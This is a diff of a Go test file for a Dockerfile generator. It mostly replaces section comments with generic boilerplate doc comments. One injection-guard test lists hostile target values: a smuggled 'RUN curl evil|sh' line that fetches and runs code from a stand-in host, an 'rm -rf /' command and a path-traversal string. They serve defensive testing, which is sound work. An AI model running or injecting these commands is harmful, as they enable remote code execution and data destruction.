@@ -1,3 +1,8 @@
+// Package dockerfile defines tests for generate test.
+//
+// This file is part of the IICPC benchmarking platform and keeps its
+// responsibilities local to the surrounding package. It should be read with
+// the service-level design in design.md for broader operational context.
 package dockerfile
 
 import (
@@ -5,8 +10,8 @@ import (
 	"testing"
 )
 
-// ── Happy paths ──────────────────────────────────────────────────────────────
-
+// TestGenerate_Go performs the package-specific operation described by its name.
+// It keeps validation, side effects, and returned values within this package's contract.
 func TestGenerate_Go(t *testing.T) {
 	out, err := Generate("go", "go", "myapp", 9090)
 	if err != nil {
@@ -20,6 +25,8 @@ func TestGenerate_Go(t *testing.T) {
 	assertContains(t, out, "./src")
 }
 
+// TestGenerate_Rust performs the package-specific operation described by its name.
+// It keeps validation, side effects, and returned values within this package's contract.
 func TestGenerate_Rust(t *testing.T) {
 	out, err := Generate("rust", "cargo", "trader", 8080)
 	if err != nil {
@@ -33,6 +40,8 @@ func TestGenerate_Rust(t *testing.T) {
 	assertContains(t, out, "target/release/trader")
 }
 
+// TestGenerate_Cpp performs the package-specific operation described by its name.
+// It keeps validation, side effects, and returned values within this package's contract.
 func TestGenerate_Cpp(t *testing.T) {
 	out, err := Generate("cpp", "cmake", "engine", 5000)
 	if err != nil {
@@ -45,8 +54,8 @@ func TestGenerate_Cpp(t *testing.T) {
 	assertContains(t, out, "cmake")
 }
 
-// ── Target and port substitution ─────────────────────────────────────────────
-
+// TestGenerate_TargetAppearsCorrectly performs the package-specific operation described by its name.
+// It keeps validation, side effects, and returned values within this package's contract.
 func TestGenerate_TargetAppearsCorrectly(t *testing.T) {
 	cases := []struct {
 		lang   string
@@ -69,6 +78,8 @@ func TestGenerate_TargetAppearsCorrectly(t *testing.T) {
 	}
 }
 
+// TestGenerate_PortAppearsCorrectly performs the package-specific operation described by its name.
+// It keeps validation, side effects, and returned values within this package's contract.
 func TestGenerate_PortAppearsCorrectly(t *testing.T) {
 	for _, lang := range []string{"go", "rust", "cpp"} {
 		t.Run(lang, func(t *testing.T) {
@@ -81,8 +92,8 @@ func TestGenerate_PortAppearsCorrectly(t *testing.T) {
 	}
 }
 
-// ── Multi-stage build structure ───────────────────────────────────────────────
-
+// TestGenerate_MultiStage performs the package-specific operation described by its name.
+// It keeps validation, side effects, and returned values within this package's contract.
 func TestGenerate_MultiStage(t *testing.T) {
 	for _, lang := range []string{"go", "rust", "cpp"} {
 		t.Run(lang, func(t *testing.T) {
@@ -91,8 +102,6 @@ func TestGenerate_MultiStage(t *testing.T) {
 				t.Fatalf("unexpected error: %v", err)
 			}
 			fromCount := strings.Count(out, "\nFROM ")
-			// Multi-stage = at least 2 FROM directives.
-			// First line starts without \n so add 1 if output starts with FROM.
 			if strings.HasPrefix(out, "FROM ") {
 				fromCount++
 			}
@@ -103,8 +112,8 @@ func TestGenerate_MultiStage(t *testing.T) {
 	}
 }
 
-// ── Error cases ───────────────────────────────────────────────────────────────
-
+// TestGenerate_UnsupportedLanguage performs the package-specific operation described by its name.
+// It keeps validation, side effects, and returned values within this package's contract.
 func TestGenerate_UnsupportedLanguage(t *testing.T) {
 	_, err := Generate("python", "pip", "app", 8080)
 	if err == nil {
@@ -115,6 +124,8 @@ func TestGenerate_UnsupportedLanguage(t *testing.T) {
 	}
 }
 
+// TestGenerate_EmptyLanguage performs the package-specific operation described by its name.
+// It keeps validation, side effects, and returned values within this package's contract.
 func TestGenerate_EmptyLanguage(t *testing.T) {
 	_, err := Generate("", "", "app", 8080)
 	if err == nil {
@@ -122,10 +133,9 @@ func TestGenerate_EmptyLanguage(t *testing.T) {
 	}
 }
 
-// ── buildType is ignored (reserved) ──────────────────────────────────────────
-
+// TestGenerate_BuildTypeIgnored performs the package-specific operation described by its name.
+// It keeps validation, side effects, and returned values within this package's contract.
 func TestGenerate_BuildTypeIgnored(t *testing.T) {
-	// buildType is currently unused — any value should produce the same output.
 	out1, err1 := Generate("go", "go", "algo", 8080)
 	out2, err2 := Generate("go", "something_else", "algo", 8080)
 	if err1 != nil || err2 != nil {
@@ -136,11 +146,8 @@ func TestGenerate_BuildTypeIgnored(t *testing.T) {
 	}
 }
 
-// ── Injection guard (M20, build-worker side) ─────────────────────────────────
-
-// TestGenerate_RejectsInjectionTarget reproduces M20: the target is interpolated
-// unescaped into the generated Dockerfile (RUN/COPY/ENTRYPOINT), so values with
-// shell/Dockerfile metacharacters must be rejected before rendering.
+// TestGenerate_RejectsInjectionTarget performs the package-specific operation described by its name.
+// It keeps validation, side effects, and returned values within this package's contract.
 func TestGenerate_RejectsInjectionTarget(t *testing.T) {
 	for _, bad := range []string{"app\"\nRUN curl evil|sh", "app; rm -rf /", "../../x", "a b", ""} {
 		if _, err := Generate("go", "go", bad, 9898); err == nil {
@@ -152,8 +159,8 @@ func TestGenerate_RejectsInjectionTarget(t *testing.T) {
 	}
 }
 
-// ── helper ────────────────────────────────────────────────────────────────────
-
+// assertContains performs the package-specific operation described by its name.
+// It keeps validation, side effects, and returned values within this package's contract.
 func assertContains(t *testing.T, haystack, needle string) {
 	t.Helper()
 	if !strings.Contains(haystack, needle) {
